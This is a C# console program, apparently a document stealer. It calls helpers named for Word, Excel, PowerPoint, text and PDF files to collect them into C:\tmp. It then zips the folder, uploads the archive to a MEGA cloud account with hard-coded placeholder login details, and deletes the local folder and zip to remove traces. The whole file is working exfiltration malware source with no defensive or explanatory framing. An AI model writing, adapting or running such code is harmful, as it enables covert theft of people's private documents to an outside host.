using CG.Web.MegaApiClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.Remoting.Messaging;

namespace Collect_data
{
    class Program
    {
        static void Main(string[] args)
        {

            DirectoryInfo targetFolder = new DirectoryInfo("C:\\tmp");

             if (!targetFolder.Exists)
             {
                 Directory.CreateDirectory("C:\\tmp");
             }

             docx_doc.Docx_doc();
             xlsx_xls.Xlsx_xls();
             pptx_ppt.Pptx();
             txt.Txt();
             pdf.Pdf();

             CompressAndDeleteFolder();     
        }

        public static void CompressAndDeleteFolder()
        {

            string sourceFolder = "C:\\tmp";            
            string zipFile = "C:\\tmp.zip";

            if (File.Exists(zipFile))
            {
                return;
            }
         
            ZipFile.CreateFromDirectory(sourceFolder, zipFile);
            Directory.Delete("C:\\tmp", true);

            UploadDeleteZip();
        }

        public static void UploadDeleteZip()
        {

            var mega = new MegaApiClient();                                           
            mega.Login("logon", "password");             

            IEnumerable<INode> nodes = mega.GetNodes();                               

            INode root = nodes.Single(x => x.Type == NodeType.Root);                  
            INode myFolder = mega.CreateFolder("Upload " + DateTime.Now, root);                       

            INode myFile = mega.UploadFile("C:\\tmp.zip", myFolder);                   
            Uri downloadLink = mega.GetDownloadLink(myFile);

            if (File.Exists("C:\\tmp.zip"))
            {
                File.Delete("C:\\tmp.zip");
            }

            
        }
    }
}
